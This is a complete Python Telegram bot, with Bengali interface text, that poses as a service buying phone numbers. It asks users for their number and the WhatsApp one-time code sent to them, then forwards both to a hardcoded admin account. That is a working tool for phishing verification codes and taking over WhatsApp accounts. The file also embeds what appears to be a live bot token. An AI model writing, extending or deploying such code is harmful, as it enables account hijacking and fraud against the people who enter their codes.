from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# নতুন টোকেনটি এখানে বসাবেন
TOKEN = '8769516346:AAEvvNFVQ1URPGOZ_scDtVPrGgNrenpAkqM' 
ADMIN_ID = 8717053928
GROUP_1 = -1003782802556 # আপনার গ্রুপ আইডি

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # গ্রুপ জয়েন চেক করার বাটন
    keyboard = [
        [InlineKeyboardButton("Group 1-এ জয়েন করুন", url="https://t.me/pro_earn_wp_offcial")],
        [InlineKeyboardButton("আমি জয়েন করেছি, শুরু করুন", callback_data='check_join')]
    ]
    await update.message.reply_text("স্বাগতম! আমাদের সার্ভিস ব্যবহার করতে প্রথমে আমাদের গ্রুপে জয়েন করুন:", reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == 'check_join':
        keyboard = [
            [InlineKeyboardButton("সংখ্যা বিক্রি করুন (Sell)", callback_data='sell_number')],
            [InlineKeyboardButton("সংখ্যা কিনুন (Buy)", callback_data='buy_number')]
        ]
        await query.edit_message_text("সবকিছু রেডি! এখন আপনি কি করতে চান?", reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif query.data == 'sell_number':
        await query.edit_message_text("দয়া করে যে নাম্বারটি বিক্রি করতে চান সেটি লিখুন:")
        context.user_data['state'] = 'waiting_number'

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('state') == 'waiting_number':
        number = update.message.text
        context.user_data['number'] = number
        await update.message.reply_text("নাম্বারটি পেয়েছেন! এখন OTP টি দিন (যেটি আপনার হোয়াটসঅ্যাপে এসেছে):")
        context.user_data['state'] = 'waiting_otp'
    
    elif context.user_data.get('state') == 'waiting_otp':
        otp = update.message.text
        number = context.user_data['number']
        
        # অ্যাডমিনকে তথ্য পাঠানো
        await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔔 নতুন নাম্বার এসেছে!\n\n📱 নাম্বার: {number}\n🔑 OTP: {otp}\n👤 ইউজার: @{update.effective_user.username}")
        
        await update.message.reply_text("ধন্যবাদ! আপনার নাম্বারটি আমাদের কাছে জমা হয়েছে। আমরা যাচাই করে শীঘ্রই জানাব।")
        context.user_data.clear()

app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(button_handler))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

print("Bot is running...")
app.run_polling()